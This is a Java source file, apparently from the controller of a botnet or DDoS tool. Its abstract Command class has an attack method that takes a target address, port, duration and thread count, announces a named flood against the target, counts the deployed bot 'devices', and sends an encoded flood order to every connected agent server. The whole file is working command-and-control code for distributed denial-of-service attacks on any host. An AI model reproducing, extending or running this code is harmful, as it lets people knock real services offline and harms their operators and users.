package org.anywhere.master.command;

import lombok.Getter;
import org.anywhere.master.encoder.EncoderManager;
import org.anywhere.master.server.ServerData;
import org.anywhere.master.utils.NumberUtils;
import org.anywhere.master.utils.Print;

import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.util.Random;
import java.util.concurrent.ConcurrentLinkedQueue;

public abstract class Command {

    @Getter
    private final String command, alias, syntax, description;
    @Getter
    private final boolean method;
    private final Random random;

    public Command(final String command, final String alias, final String syntax, final String description, final boolean method) {
        this.command = command;
        this.alias = alias;
        this.syntax = syntax;
        this.description = description;
        this.method = method;
        this.random = new Random();
    }

    protected void attack(final String[] args, final String method, final EncoderManager encoderManager, final ConcurrentLinkedQueue<ServerData> serverData) {
        if (args.length != 5 && args.length != 4) {
            Print.println(Print.LIGHT_RED + "Error : " + this.getSyntax());
            return;
        }
        if (serverData.isEmpty()) {
            Print.println(Print.LIGHT_RED + "No servers have ever been registered");
            return;
        }
        if (serverData.stream().noneMatch(ServerData::isConnected)) {
            Print.println(Print.LIGHT_RED + "No servers are currently online");
            return;
        }
        final String port = args[2];
        final String time = args[3];
        final String threads = args.length == 5 ? args[4] : "5";
        if (!NumberUtils.isInteger(port) || !NumberUtils.isInteger(time) || !NumberUtils.isInteger(threads)) {
            Print.println(Print.LIGHT_RED + "Error : " + this.getSyntax());
            return;
        }
        final String address = args[1];
        final int id = this.random.nextInt(Integer.MAX_VALUE);
        Print.println(Print.LIGHT_GREY + "Starting " + Print.LIGHT_CYAN + method.toUpperCase() + " Flood" + Print.LIGHT_GREY + " to " + Print.LIGHT_CYAN + address + ":" + port + Print.LIGHT_GREY + " for " + Print.LIGHT_CYAN + time + " second(s) " + Print.LIGHT_GREY + "with " + Print.LIGHT_CYAN + threads + " thread(s)");
        Print.println(Print.LIGHT_CYAN + serverData.stream().mapToInt(ServerData::getAgents).sum() + " devices" + Print.LIGHT_GREY + " were deployed on this host! (#" + id + ")");
        serverData.forEach(data -> {
            final PrintWriter printWriter = data.getPrintWriter();
            printWriter.println("M:" + method.toLowerCase() + ":" + new String((encoderManager.encode(address.replace(":", "(doubleDot)") + ":" + port + ":" + time + ":" + threads + ":" + id)).getBytes(StandardCharsets.UTF_8)));
            printWriter.flush();
        });
    }

    public abstract void execute(final String[] args);
}
